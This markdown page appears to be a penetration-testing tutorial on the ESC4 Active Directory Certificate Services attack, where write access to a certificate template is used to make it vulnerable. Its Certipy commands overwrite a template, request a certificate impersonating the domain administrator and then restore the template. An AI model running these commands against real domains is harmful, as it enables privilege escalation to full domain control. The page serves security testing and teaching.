---
title: 'ESC4: Build-A-Bear (But For Vulnerabilities)'
description: 'ESC4: Build-A-Bear (But For Vulnerabilities).'
---
# ESC4: Build-A-Bear (But For Vulnerabilities)

ESC4 is less about finding a vulnerability, and more about *creating* one.

This occurs when you (a low-privileged user) have write access (specifically `WriteProperty` or `WriteDacl`) over a Certificate Template object in Active Directory.

If you can edit the template, you can simply change its configuration to make it vulnerable to ESC1, ESC2, or ESC3. You literally log in, flip the "Make Vulnerable" switches, request your Domain Admin certificate, and then (if you're polite) flip the switches back.

## The Attack Path

### 1. Identify Write Access
First, find a template where you have modify rights. Tools like BloodHound are fantastic for visualizing this (look for `WriteDacl` or `GenericWrite` edges from your user to a Certificate Template).

### 2. Modify the Template
Let's use `modifyCertTemplate.py` (or Certipy) to push the misconfiguration. We will add the `ENROLLEE_SUPPLIES_SUBJECT` flag, turning a boring, secure template into a beautiful ESC1 vulnerability.

* **Using Certipy (The elegant way)**:
    Certipy has a built-in feature to save the old configuration, make the template vulnerable to ESC1, and ready it for exploitation.
    ```bash
    # Overwrite the configuration and save a backup
    certipy template 'corp.local/john:Passw0rd!@ca.corp.local' -template 'SecureTemplate' -save-old
    ```

### 3. Exploit (ESC1)
Now that the template is functionally ESC1, exploit it exactly as you would normally.
```bash
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'SecureTemplate' -upn 'administrator@corp.local'
```

### 4. Clean Up Your Mess
Always leave the environment exactly as you found it. Restore the template's original configuration using the backup Certipy made.
```bash
certipy template 'corp.local/john:Passw0rd!@ca.corp.local' -template 'SecureTemplate' -configuration SecureTemplate.json
```
